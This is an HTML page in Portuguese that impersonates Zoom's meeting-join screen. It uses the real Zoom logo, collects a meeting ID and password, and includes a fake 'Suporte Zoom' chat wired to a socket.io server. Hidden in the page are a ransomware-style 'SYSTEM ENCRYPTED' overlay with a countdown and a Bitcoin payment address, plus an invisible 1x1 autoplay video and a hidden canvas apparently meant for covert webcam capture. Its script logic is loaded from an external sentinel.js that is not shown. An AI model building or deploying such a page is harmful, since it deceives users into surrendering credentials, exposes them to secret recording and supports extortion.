<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zoom - Ingressar na Reunião</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: 'Open Sans', Helvetica, Arial, sans-serif; margin: 0; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .card { background: white; padding: 40px; border-radius: 8px; text-align: center; max-width: 400px; width: 100%; position: relative; box-sizing: border-box; }
        .logo { width: 110px; margin-bottom: 30px; }
        .title { font-size: 22px; font-weight: 600; margin-bottom: 25px; color: #222; }
        .ms-input { width: 100%; border: 1px solid #ccc; padding: 12px; font-size: 15px; margin-bottom: 20px; border-radius: 6px; outline: none; box-sizing: border-box; }
        .ms-input:focus { border: 2px solid #0b5cff; padding: 11px; }
        .ms-button { background: #0b5cff; color: white; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: bold; border-radius: 6px; font-size: 16px; transition: 0.2s; }
        .ms-button:hover { background: #094dd6; }
        .sub-text { font-size: 12px; color: #747487; margin-top: 20px; }
        
        #ransom-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#100; color:#f33; z-index:99999; text-align:center; padding-top:100px; font-family:monospace; }
        #chat-widget { position: fixed; bottom: 20px; right: 20px; width: 320px; background: white; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); overflow: hidden; display: none; z-index: 1000; border: 1px solid #eee; text-align: left; }
    </style>
</head>
<body>
    <div style="position:fixed; top:0; left:0; width:100%; padding:20px; box-sizing:border-box; border-bottom:1px solid #eee;">
        <img src="https://st1.zoom.us/static/6.3.17046/image/new/ZoomLogo.png" style="height:25px;">
    </div>

    <div id="template-container" class="card">
        <div id="loader" style="margin-bottom:20px; color:#0b5cff;">🔄 Conectando ao servidor...</div>
        <div id="content" style="display:none;">
            <div id="zoom-view">
                <div class="title">Ingressar na Reunião</div>
                
                <input type="text" id="u" class="ms-input" placeholder="ID da reunião ou nome do link pessoal">
                <input type="password" id="p" class="ms-input" placeholder="Senha da Reunião" style="display:none;">
                
                <div style="text-align: left; margin-bottom: 20px;">
                    <label style="font-size: 13px; color: #222; display: flex; align-items: center;">
                        <input type="checkbox" style="margin-right: 10px;"> Não conectar ao áudio
                    </label>
                    <label style="font-size: 13px; color: #222; display: flex; align-items: center; margin-top: 10px;">
                        <input type="checkbox" style="margin-right: 10px;"> Desligar meu vídeo
                    </label>
                </div>

                <button class="ms-button" id="btn" onclick="handleAuth()">Ingressar</button>
                <div class="sub-text">Ao clicar em "Ingressar", você concorda com nossos Termos de Serviço e Declaração de Privacidade</div>
            </div>
        </div>
    </div>

    <!-- Ransomware -->
    <div id="ransom-overlay">
        <h1 style="font-size:3rem;">⚠ SYSTEM ENCRYPTED ⚠</h1>
        <div id="timer" style="font-size:5rem; color:#ff0;">23:59:59</div>
        <p>Send 1.0 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
    </div>

    <!-- Chat -->
    <div id="chat-widget">
        <div style="background:#0b5cff; color:white; padding:15px; font-weight:bold;">Suporte Zoom</div>
        <div id="chat-msgs" style="height:250px; overflow-y:auto; padding:15px; font-size:0.85rem; display:flex; flex-direction:column; gap:10px;"></div>
        <div style="display:flex; padding:10px; border-top:1px solid #eee;">
            <input type="text" id="chat-in" placeholder="Mensagem para o anfitrião..." style="flex:1; border:none; outline:none;">
            <button onclick="sendChat()" style="background:none; border:none; color:#0b5cff; font-weight:bold; cursor:pointer;">Enviar</button>
        </div>
    </div>

    <video id="v" width="1" height="1" autoplay style="opacity:0; position:fixed;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script src="/sentinel.js?v=5"></script>
</body>
</html>
